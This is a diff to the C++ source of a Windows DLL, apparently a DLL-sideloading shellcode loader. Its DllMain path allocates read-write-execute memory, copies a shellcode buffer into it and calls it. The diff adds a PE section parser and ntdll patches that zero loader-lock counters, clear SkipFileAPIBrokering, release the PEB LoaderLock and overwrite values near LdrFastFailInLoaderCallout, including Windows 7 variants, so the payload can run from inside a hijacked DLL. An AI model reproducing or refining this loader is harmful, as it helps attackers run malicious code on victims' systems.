@@ -1,4 +1,5 @@
 ﻿#include <Windows.h>
+#include <stdio.h>
 
 #include "export.hpp"
 
@@ -12,7 +13,7 @@ void runShellcode() {
     LPVOID shellcode = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, 0x40);
 
     memcpy(shellcode, buf, sizeof(buf));
-
+    printf("%x \n", shellcode);
     void(*func)();
     func = (void(*)())shellcode;
     func();
@@ -199,6 +200,28 @@ size_t memFind(BYTE* mem, BYTE* search, size_t memSize, size_t length)
     return 0;
 }
 
+BYTE* readSectionData(BYTE* buffer, PDWORD rdataLength, char* secName) {
+    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer);
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        return 0;
+}
+
+    PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(buffer) + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        return 0;
+    }
+
+    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
+        if (strcmp(secName, (char*)sectionHeader[i].Name) == 0) {
+            *rdataLength = sectionHeader[i].Misc.VirtualSize;
+            return reinterpret_cast<BYTE*>(buffer) + sectionHeader[i].VirtualAddress;
+        }
+    }
+
+    return 0;
+}
+
 size_t GetSkipFileAPIBrokering(VOID)
 {
 #if defined(_WIN64)
@@ -209,44 +232,32 @@ size_t GetSkipFileAPIBrokering(VOID)
 }
 
 #ifdef _WIN64
-    unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xEE, 0x17, 0x00, 0x00 };
+    unsigned char lock_count_flag[] = {0x66, 0x21, 0x88, 0xEE, 0x17, 0x00, 0x00};
+    unsigned char win7_lock_count_flag[] = {0xF0, 0x44, 0x0F, 0xB1, 0x35};
 #else
     unsigned char lock_count_flag[] = {0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00, 0xE8};
+    unsigned char win7_lock_count_flag[] = {0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB};
 #endif
 
 VOID UNLOOK()
 {
     HMODULE base = GetModuleHandleA("ntdll.dll");
-    PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)base;
-    DWORD size_of_img;
-
-    if (*(PWORD)((size_t)pDH + pDH->e_lfanew + 0x18) == IMAGE_NT_OPTIONAL_HDR32_MAGIC){
-        PIMAGE_NT_HEADERS32  pNtH32 = PIMAGE_NT_HEADERS32((size_t)pDH + pDH->e_lfanew);
-        PIMAGE_OPTIONAL_HEADER32 pOH32 = &pNtH32->OptionalHeader;
-
-        size_of_img = pOH32->SizeOfImage;
-    }
-    else {
-        PIMAGE_NT_HEADERS64 pNtH64 = PIMAGE_NT_HEADERS64((size_t)pDH + pDH->e_lfanew);
-        PIMAGE_OPTIONAL_HEADER64 pOH64 = &pNtH64->OptionalHeader;
-
-        size_of_img = pOH64->SizeOfImage;
-    }
+    DWORD rdataLength;
+    BYTE* textData = readSectionData((BYTE*)base, &rdataLength, ".text");
 
     //适用于win7以上的系统，需要格外修改值
-    size_t addr = memFind((BYTE*)base, lock_count_flag, (size_t)base + size_of_img, sizeof(lock_count_flag));
-    Sleep(1);
+    size_t addr = memFind(textData, lock_count_flag, (size_t)textData + rdataLength, sizeof(lock_count_flag));
+    
     if (addr != 0)
     {
 #ifdef _WIN64
         addr = (size_t)addr + 0x15;
         addr = addr + 5 + *(PDWORD)addr;
-        *(PDWORD)addr = (*(PDWORD)addr) & 0;
 #else
         addr = (size_t)addr + 0xe;
         addr = *(PDWORD)addr;
-        *(PDWORD)addr = (*(PDWORD)addr) & 0;
 #endif
+        * (PDWORD)addr = (*(PDWORD)addr) & 0;
 
         size_t skipFileAPIBrokeringAddr = GetSkipFileAPIBrokering();
         (*(PWORD)skipFileAPIBrokeringAddr) = (*(PWORD)skipFileAPIBrokeringAddr) & 0xEFFF;
@@ -264,6 +275,30 @@ VOID UNLOOK()
     RtlLeaveCriticalSection = (RTLLEAVECRITICALSECTION)GetProcAddress((HMODULE)hModule, "RtlLeaveCriticalSection");
 
     RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)Peb->LoaderLock);
+
+    //win7 和 08以下系统没有LdrFastFailInLoaderCallout导出函数
+    size_t hookAddr = (size_t)GetProcAddress((HMODULE)hModule, "LdrFastFailInLoaderCallout");
+    
+    if (hookAddr > 0) {
+#ifdef _WIN64
+        hookAddr = hookAddr + 0x18 + 5 + *(PDWORD)(hookAddr + 0x18);
+#else
+        hookAddr = *(PDWORD)(hookAddr + 0x13);
+#endif
+        *(PDWORD)hookAddr = 2;
+    }
+
+    addr = memFind(textData, win7_lock_count_flag, (size_t)textData + rdataLength, sizeof(win7_lock_count_flag));
+    Sleep(1);
+    if (addr != 0)
+    {   
+#ifdef _WIN64
+        hookAddr = addr + 0x5 + 4 + *(PDWORD)(addr + 0x5);
+#else
+        hookAddr = *(PDWORD)((size_t)addr + 0x8);
+#endif
+        *(PDWORD)hookAddr = 2;
+    }
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
